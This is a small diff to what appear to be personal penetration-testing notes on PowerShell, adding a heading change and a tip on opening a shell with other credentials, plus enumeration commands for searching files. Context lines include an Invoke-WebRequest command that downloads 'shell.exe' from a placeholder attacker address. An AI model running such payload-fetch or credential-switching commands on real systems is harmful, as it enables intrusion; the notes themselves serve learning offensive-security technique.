@@ -28,7 +28,7 @@ Now a man-page like output should help discovering how to use it.
 Invoke-WebRequest -Uri "http://${ATTACK_IP}:${PORT}/shell.exe" -OutFile "shell.exe"
 ```
 
-## Useful commands cmdlets
+## Useful commands cmdlets for searching and enumerating
 
 searching, similar to `find`:
 ```
@@ -77,4 +77,11 @@ Get-ChildItem -Path "C:\" -Recurse -Filter "*filter*" | Select-Object -First 1 |
 
 This will cat the contents of the first file the `Get-ChildItem` cmdlet outputs.
 
+## Open powershell terminal with other credentials:
 
+```
+start powershell -credential ""
+```
+
+Note you need to kill the parent shell for this to work.
+There are probably smarter ways.
